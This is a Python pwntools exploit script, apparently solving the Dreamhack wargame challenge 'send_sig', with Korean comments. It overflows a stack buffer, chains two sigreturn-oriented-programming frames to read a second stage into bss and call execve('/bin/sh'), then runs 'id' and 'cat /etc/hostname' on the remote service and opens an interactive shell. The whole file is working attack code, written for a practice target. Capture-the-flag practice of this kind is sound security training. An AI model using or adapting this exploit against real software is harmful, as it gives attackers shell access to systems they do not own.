from pwn import *
context.arch = 'amd64'
context.log_level = 'warn'

e = ELF('./send_sig')
#p = process('./send_sig')
p = remote('host3.dreamhack.games', 13790)

pop_rax_ret = next(e.search(asm('pop rax; ret')))
syscall     = next(e.search(asm('syscall; ret')))
bss         = e.bss() + 0x100   # 앞쪽 데이터 안 건드리게 여유

# ---- 1단계: SROP로 read(0, bss, 0x400) ----
f1 = SigreturnFrame()
f1.rax = 0        # SYS_read
f1.rdi = 0
f1.rsi = bss
f1.rdx = 0x400
f1.rip = syscall
f1.rsp = bss      # read 후 ret이 [bss]로 피벗

payload  = b'A'*16                # 버퍼(8) + 저장된 RBP(8)
payload += p64(pop_rax_ret)       # 리턴주소 (오프셋 16)
payload += p64(15)
payload += p64(syscall)           # ★ 빠졌던 syscall 가젯
payload += bytes(f1)
p.sendline(payload)

# ---- 2단계: SROP로 execve("/bin/sh", 0, 0) ----
chain  = p64(pop_rax_ret) + p64(15) + p64(syscall)
binsh  = bss + len(chain) + len(bytes(SigreturnFrame()))  # 프레임 뒤 문자열 위치

f2 = SigreturnFrame()
f2.rax = 0x3b     # execve
f2.rdi = binsh
f2.rsi = 0
f2.rdx = 0
f2.rip = syscall

chain += bytes(f2)
chain += b'/bin/sh\x00'
p.sendline(chain)

p.sendline(b'echo PWNED; id; cat /etc/hostname')
import time; time.sleep(0.3)
print(p.recv(timeout=1).decode(errors='replace'))

p.interactive()